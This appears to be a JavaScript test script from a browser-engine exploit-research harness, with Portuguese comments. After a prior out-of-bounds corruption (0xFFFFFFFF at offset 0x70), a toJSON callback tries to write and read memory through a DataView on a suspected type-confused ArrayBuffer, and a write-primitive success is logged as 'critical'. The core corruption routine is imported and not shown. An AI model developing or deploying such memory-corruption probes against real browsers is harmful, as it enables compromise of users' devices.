// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

// Variante: Tenta criar DataView em 'this' e escrever/ler
function toJSON_AttemptWriteToThis() {
    // Não usar current_toJSON_call_count_for_TypeError_test++ aqui.
    // Não usar logS3 ou document.title aqui para evitar TypeError conhecido.
    
    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis",
        this_type: "N/A",
        dataview_created: false,
        written_value: null,
        read_back_value: null,
        write_match: false,
        error_in_toJSON: null
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);

        if (this instanceof ArrayBuffer) {
            if (this.byteLength >= 4) { // Checar se o buffer tem tamanho suficiente
                try {
                    let dv = new DataView(this);
                    result_payload.dataview_created = true;
                    
                    const val_to_write = 0x41424344;
                    dv.setUint32(0, val_to_write, true); // Escreve no início de 'this'
                    result_payload.written_value = toHex(val_to_write);
                    
                    result_payload.read_back_value = toHex(dv.getUint32(0, true));
                    
                    if (dv.getUint32(0, true) === val_to_write) {
                        result_payload.write_match = true;
                    }
                } catch (e_dv) {
                    result_payload.error_in_toJSON = `DataView Error: ${e_dv.name} - ${e_dv.message}`;
                }
            } else {
                result_payload.error_in_toJSON = "this (ArrayBuffer) is too small for DV write/read (min 4 bytes).";
            }
        } else {
            result_payload.error_in_toJSON = "this is not an ArrayBuffer.";
        }
    } catch (e_main) {
        result_payload.error_in_toJSON = `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}`;
    }
    
    return result_payload;
}


async function runWriteToThisInToJSONTest() {
    const FNAME_RUNNER = "runWriteToThisInToJSONTest";
    logS3(`==== INICIANDO Tentativa de Escrita em 'this' (ArrayBuffer) via toJSON ====`, 'test', FNAME_RUNNER);

    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const testDescription = `WriteToThis_OOB_${toHex(valueForCorruption)}_at_${toHex(criticalOffset)}`;
    
    logS3(`\n--- Executando Teste: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
    
    let result = await executeFocusedTestForTypeError(
        testDescription,
        toJSON_AttemptWriteToThis,
        valueForCorruption,
        criticalOffset
    );

    if (result.errorOccurred) {
        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO (stringify): ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "error");
    } else if (result.potentiallyCrashed) {
        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
    } else {
        logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito no stringify.`, "good", FNAME_RUNNER);
        logS3(`      Resultado da toJSON (stringifyResult): ${JSON.stringify(result.stringifyResult)}`, "leak", FNAME_RUNNER);

        // Análise mais detalhada do objeto retornado pela toJSON
        if (result.stringifyResult && result.stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis") {
            if (result.stringifyResult.error_in_toJSON) {
                logS3(`      ERRO DENTRO da toJSON: ${result.stringifyResult.error_in_toJSON}`, "warn", FNAME_RUNNER);
            } else {
                logS3(`      Tipo de 'this' na toJSON: ${result.stringifyResult.this_type}`, "info", FNAME_RUNNER);
                logS3(`      DataView criada na toJSON: ${result.stringifyResult.dataview_created}`, "info", FNAME_RUNNER);
                logS3(`      Valor escrito em 'this[0]': ${result.stringifyResult.written_value}`, "info", FNAME_RUNNER);
                logS3(`      Valor lido de 'this[0]': ${result.stringifyResult.read_back_value}`, "leak", FNAME_RUNNER);
                if (result.stringifyResult.write_match) {
                    logS3(`      !!!! ESCRITA E LEITURA EM 'this' (ArrayBuffer) DENTRO DA toJSON BEM-SUCEDIDA !!!!`, "critical", FNAME_RUNNER);
                    document.title = `SUCCESS: Write to 'this' in toJSON OK!`;
                } else {
                    logS3(`      Falha na correspondência escrita/leitura em 'this' dentro da toJSON.`, "warn", FNAME_RUNNER);
                }
            }
        }
    }
    logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Tentativa de Escrita em 'this' (ArrayBuffer) via toJSON CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_AttemptWriteToThis';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Tentativa de Escrita em 'this' (ArrayBuffer) via toJSON Pós-Corrupção ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Write To 'this' in toJSON";
    
    await runWriteToThisInToJSONTest();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Tentativa de Escrita em 'this' via toJSON) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO")) {
        // Manter título de erro
    } else if (document.title.includes("SUCCESS")) {
        // Manter título de sucesso
    }
    else {
        document.title = "Script 3 Concluído - Write To 'this' in toJSON";
    }
}
